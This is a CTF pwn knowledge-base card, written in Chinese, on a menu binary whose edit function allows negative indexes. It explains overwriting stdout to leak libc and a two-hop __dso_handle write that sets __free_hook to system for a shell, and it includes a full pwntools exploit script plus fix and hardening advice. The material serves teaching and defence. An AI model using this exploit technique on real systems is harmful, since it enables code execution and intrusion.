---
id: ctf-pwn-negative-index-pointer-array-stdout-freehook-system
title: 负下标全局指针数组越界：改 stdout 泄 libc + 经 __dso_handle 两跳改写 __free_hook 为 system
type: scenario
domain: ctf
path: ctf/pwn
technique: negative-index-pointer-array-stdout-freehook
aliases:
- user
- 上海市大学生网络安全大赛
- 负下标指针数组
- edit 缺下界
- stdout 泄 libc
- __dso_handle 两跳
- __free_hook 改 system
tags:
- ctf
- pwn
- negative-index
- oob
- pointer-array
- stdout
- fsop
- free-hook
- system
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V243
  verified_at: '2026-11-07T13:18:40+08:00'
  notes: 已对照原文与14张图核对：edit 仅检查 index>4 缺下界、heap[-8] 对应 stdout 指针、heap[-11] 对应 __dso_handle、两次 edit(-11) 两跳写 __free_hook、free('/bin/sh') 触发 system，与 GDB 布局和 exp 一致；已把 PoC 说明中 edit_ 的表述改准确。dup-scan 与 negative-index-note-array 卡为 related，非同一链。未验证点：未复跑；原始 offset 0x1b5fd9 依赖目标 libc；无 sources/版本。
---

## 一句话结论

菜单 edit 只用 `if (index > 4)` 检查上界、不检查下界，而 `heap` 是全局指针数组：`heap[index]` 被当作“要写入的目标地址”，负下标就能命中数组前方的 stdout 指针与 `__dso_handle`。先用 `edit(-8, ...)` 把 stdout 结构的 `_flags` 改为 `0xfbad1800` 并清空后续字段，借下一次输出带出 libc 指针；再用 `edit(-11, p64(free_hook))` 把 `__dso_handle` 槽改成 `__free_hook` 地址，第二次 `edit(-11, p64(system))` 就会写到 `__free_hook`，最后 free 含 `"/bin/sh"` 的堆块触发 `system("/bin/sh")`。

## 原理

- **指针数组的负下标**：`heap` 是全局 qword 数组，`heap[n]` 保存的是用户名的堆指针。`edit` 的实现是 `ptr = heap[index]; if (ptr) read(0, ptr, 0x40)`——它不写 `heap[index]` 本身，而是把 `heap[index]` 当目标地址写。因此负下标访问的是数组之前的全局数据，而这些位置刚好是指向 libc 的指针（stdout/stderr 等）或可写槽位。
- **stdout 泄 libc**：程序运行时 `heap[-8]` 对应 stdout 的 copy relocation/指针（gdb 中 `0x...8020` 处为 `_IO_2_1_stdout_`）。把 stdout 结构开头的 `_flags` 改成 `0xfbad1800`、后续字段清零，会让下一次格式化输出按被篡改的 FILE 缓冲指针越界读取，从而把 libc 地址带出；连续接收并减去已知 `_IO_2_1_stdout_` 偏移（原文 `0x1b5fd9`）得到 `libc_base`。
- **两跳写 __free_hook**：`heap[-11]` 对应 `__dso_handle` 槽，原值是“指向自身”的指针。第一次 `edit(-11, p64(free_hook))` 写入的是 `__dso_handle` 指向的内存（即该槽自身），把它改成 `free_hook` 地址；第二次 `edit(-11, p64(system))` 读取该槽，发现它已是非空指针 `free_hook`，于是把 `system` 写入 `__free_hook`。这就是“指针数组写目标”特性带来的两跳任意写。
- **触发**：`__free_hook` 在 glibc 2.34 之前会在 `free()` 时被调用；堆块 0 保存 `"/bin/sh\0"`，`delete(0)` 释放时执行 `__free_hook(ptr)`，即 `system("/bin/sh")`。
- **为什么 edit 能到负下标**：`atoi` 接受负数字符串，`n4 > 4` 对负数不成立；`read` 目标来自 `heap[n4]`，因此只要该位置的 qword 非空就能写。

## 触发条件

- 菜单程序用全局指针数组保存堆块，edit/delete/show 的 index 只做上界检查，未检查 `index >= 0`。
- 指针数组前方存在指向 libc 的全局指针（stdout/stderr/__dso_handle 等）或可写槽位，且程序在后续输出中会使用被篡改的 FILE 结构。
- 目标 libc 版本低于 2.34（存在 `__free_hook`），或可改用 `__malloc_hook`/FSOP 等其他 hook。
- 程序有可触发 `free()` 的 delete 功能，且能控制被 free 的堆块内容（放入 `"/bin/sh"`）。

## 利用步骤

1. 逆向菜单，确认 `heap` 是全局指针数组、edit 的 `index` 只检查上界、`read` 目标为 `heap[index]`。
2. 用 gdb 查看 `&heap` 前后的内存布局，标出 `heap[-8]`（stdout 指针）、`heap[-11]`（`__dso_handle` 槽）等负下标对应的对象。
3. `add("/bin/sh\x00")` 与 `add("b")` 准备两个堆块，记录索引 0/1。
4. `edit(-8, p64(0xfbad1800) + p64(0)*3 + b"\x00")` 篡改 stdout；随后执行一次会输出的操作，接收泄漏并按 `_IO_2_1_stdout_` 偏移计算 `libc_base`。
5. 计算 `system` 与 `__free_hook` 地址；`edit(-11, p64(free_hook))` 改写 `__dso_handle` 槽，再 `edit(-11, p64(system))` 把 `system` 写到 `__free_hook`。
6. `delete(0)` 释放 `"/bin/sh"` 堆块，触发 `__free_hook`，进入 shell 后读取 flag。

## PoC

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = remote('TARGET', PORT)
elf = ELF('./user')
libc = ELF('./libc.so.6')

def menu(n): p.sendlineafter(b"5. Exit\n", str(n).encode())
def add(content):
    menu(1); p.sendlineafter(b"Enter your username:\n", content)
def delete(idx):
    menu(2); p.sendlineafter(b"index:\n", str(idx).encode())
def edit(idx, content):
    menu(4); p.sendlineafter(b"index:\n", str(idx).encode())
    p.sendlineafter(b"Enter a new username:\n", content)

def l64():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

add(b'/bin/sh\x00')
add(b'b')

# 1) 负下标改 stdout，泄 libc
edit(-8, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
libc.address = l64() - 0x1b5fd9   # 连续接收 3 次，按实际回显取最后一个

# 2) 借 __dso_handle 两跳写 __free_hook
edit(-11, p64(libc.sym['__free_hook']))
edit(-11, p64(libc.sym['system']))

# 3) free('/bin/sh') 触发 __free_hook -> system
delete(0)
p.interactive()
```

说明：原文连续调用 `l64()` 三次后减 `0x1b5fd9`，实际接收次数/偏移需按目标 libc 调整；原文另定义 `edit_`（直接 `recvuntil("5. Exit")`）以绕开菜单回显，本 PoC 简化为 `edit`，实际交互需按回显调整。

## 变体与关联

- 变体：负下标可命中 `stdin`/`stderr` 的 copy relocation、GOT 表、`.fini_array` 或其他全局指针，取决于 `heap` 在 `.bss/.data` 中的位置。
- 变体：若目标 glibc ≥ 2.34 无 `__free_hook`，可改为 FSOP（`_IO_list_all`/`_IO_wfile_jumps`）或 `__malloc_hook`（更老版本）。
- 变体：若 edit 写入长度可控，可把 `heap[-11]` 两跳扩展为任意地址写，直接改写 GOT/返回地址。
- 关联：[[ctf-pwn-negative-index-note-array-copy-reloc-leak-got-system]]（负下标 note 数组 + copy relocation 泄 libc + GOT 改 system）、[[ctf-pwn-negative-index-hidden-slot-encoded-fptr]]（负下标隐藏槽 + 编码函数指针）、[[binary-pwn-heap-fsop-house-of-some-arbitrary-read-write]]（FSOP 任意读写）。
- 边界：若 `heap[index]` 为空会打印 error 而不写；负下标命中的槽值必须非空且指向可写内存；若程序在 edit 后立即退出或输出被关闭，stdout 泄露可能不成立。

## 检测与防御

- 检测（逆向侧）：菜单 index 用 `atoi` 且有 `> 4` 之类单边检查、全局指针数组、`read(0, heap[index], n)` 模式，都是负下标任意写的强特征。
- 修复：索引统一用无符号类型并同时检查 `0 <= index < MAX`；用结构体/句柄表隔离全局指针，避免数组前方紧邻敏感指针。
- 加固：使用 glibc ≥ 2.34（移除 `__free_hook`）、开启 Full RELRO/PIE、对关键 FILE 结构与 GOT 做完整性校验；限制 edit 的写入长度。
